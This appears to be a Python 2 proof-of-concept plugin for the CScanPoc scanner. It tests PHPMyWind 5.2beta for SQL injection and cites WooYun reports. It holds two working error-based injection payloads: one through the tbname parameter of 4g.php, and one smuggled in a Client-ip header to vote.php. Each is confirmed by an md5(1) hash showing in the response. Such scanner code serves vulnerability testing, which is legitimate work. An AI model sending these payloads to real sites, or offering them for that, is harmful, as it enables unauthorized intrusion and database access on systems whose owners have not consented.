# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType

class Vuln(ABVuln):
    poc_id = '4b9b3d10-c656-4028-bbec-b3280394b97e'
    name = 'PHPMyWind SQL注射漏洞'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION # 漏洞类型
    disclosure_date = '2015-01-07'  # 漏洞公布时间
    desc = '''
        5.2beta 2014-12-28 参数没有处理，绕过过滤。
    '''  # 漏洞描述
    ref = 'Unkonwn'  # 漏洞来源
    cnvd_id = 'Unkonwn'  # cnvd漏洞编号
    cve_id = 'Unkonwn'  # cve编号
    product = 'PHPMyWind'  # 漏洞应用名称
    product_version = '5.2beta'  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = 'b20a4754-c7f6-45b7-9467-b296887e96da'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-11'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            
            #Refer=http://www.wooyun.org/bugs/wooyun-2010-089760
            hh = hackhttp.hackhttp()
            payload = "/4g.php?m=show&cid=2&tbname=pmw_infolist`%20SET%20hits=hits%20WHERE%201=2%20and%20@`'`%20AND%20extractvalue(1,concat(0x5c,md5(1)))%20--%20@`'`"
            target = self.target + payload
            code, head, body, errcode, final_url = hh.http(target);
            if code == 200 and 'c4ca4238a0b923820dcc509a6f75849' in body:
                #security_hole(target)
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))


            #Refer=http://www.wooyun.org/bugs/wooyun-2010-081372
            payload = "/vote.php?id=1"
            target = self.target + payload
            raw = '''
POST xx HTTP/1.1
Host: xx
Connection: keep-alive
Content-Length: 35
Content-Type: application/x-www-form-urlencoded
Client-ip: 1.2.3.4\t' and  extractvalue(1,concat(0x5c,md5(1))) and '1'='1

options%5B%5D=1&voteid=1&action=add
            '''
            code, head, body, errcode, final_url = hh.http(target, raw=raw);
            if code == 200 and 'c4ca4238a0b923820dcc509a6f75849' in body:
                #security_hole(target))
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()

if __name__ == '__main__':
    Poc().run()
